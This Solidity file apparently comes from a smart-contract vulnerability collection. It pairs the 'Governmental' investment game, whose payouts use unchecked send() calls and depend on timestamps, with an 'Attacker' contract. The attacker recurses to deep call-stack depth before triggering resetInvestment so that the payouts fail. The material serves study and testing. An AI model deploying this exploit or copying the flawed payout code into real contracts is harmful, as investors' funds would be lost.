pragma solidity ^0.4.0;

contract Governmental {
  struct Info {
    uint j;
    uint t;
  }
  
  address public a;
  address public i;
  Info public info = Info(1 ether, 0);
  uint public m = 1 minutes;

  function Governmental() {
    a = msg.sender;
    if (msg.value<1 ether) throw;
  }

  function invest() {
    if (msg.value<info.j/2) throw;
    i = msg.sender;
    info.j += msg.value/2;
    info.t = block.timestamp;
  }

  function resetInvestment() {
    if (block.timestamp < info.t+m)
      throw;

    i.send(info.j);
    a.send(this.balance-1 ether);

    i = 0;
    info.j = 1 ether;
    info.t = 0;
  }
}

contract Attacker {
  
  struct Params {
    uint cnt;
    address tgt;
  }

  function attack(address target, uint count) {
    Params memory p = Params(count, target);
    if (0<=p.cnt && p.cnt<1023) {
      this.attack.gas(msg.gas-2000)(p.tgt, p.cnt+1);
    }
    else {
      Governmental(p.tgt).resetInvestment();
    }
  }
}